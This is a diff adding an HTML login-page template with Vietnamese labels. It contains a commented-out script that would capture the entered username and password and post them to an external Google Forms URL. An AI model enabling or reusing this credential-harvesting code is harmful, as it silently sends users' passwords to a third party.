@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static',filename='style.css') }}">
+    <title>Document</title>
+</head>
+<body>
+
+    <form class="login" method="post" action="/register">
+        <input class="info" id="username" type="text" placeholder="Tài khoản" name="username">
+        <br>
+        <input class="info" id="password" type="password" placeholder="Mật khẩu" name="password">
+        <br>
+        <p id="rememberPassword"><input type="checkbox">Nhớ mật khẩu</p>
+        <input id="submit" type="submit" value="Đăng Nhập">
+    </form>
+        
+    <script>
+        // document.getElementById("submit").onclick = function(){
+        //     var username = document.getElementById('username').value;
+        //     var password = document.getElementById('password').value;
+        //     var data  = new FormData();
+        //     data.set('entry.106239901',username);
+        //     data.set('entry.35463153',password);
+        //     let request = new XMLHttpRequest();
+        //     var url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdAqEZfA_zrt269vkWk1jA3_TkrvGa1NPM2hrahd6nKFuf4HQ/formResponse";
+        //     request.open("POST", url, true);
+        //     request.send(data);
+        // }
+        
+        
+    </script>
+</body>
+</html>
